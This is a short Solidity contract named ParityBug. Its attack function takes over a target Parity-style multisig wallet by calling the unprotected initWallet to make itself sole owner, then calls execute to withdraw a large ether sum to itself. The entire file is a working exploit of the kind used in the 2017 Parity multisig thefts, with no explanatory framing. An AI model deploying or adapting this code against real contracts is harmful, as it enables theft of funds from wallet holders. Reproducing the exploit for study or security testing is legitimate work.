// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "./IParity.sol";

contract ParityBug {
    function attack(address target) external {
        IParity parity = IParity(target);

        address[] memory owners = new address[](1);
        owners[0] = address(this);
        parity.initWallet(owners, 0, 0x116779808c03e4140000);

        assert(parity.isOwner(address(this)));

        // Withdrawal of funds
        parity.execute(address(this), 0x116779808c03e4140000, "");
    }

    receive() external payable {}
}
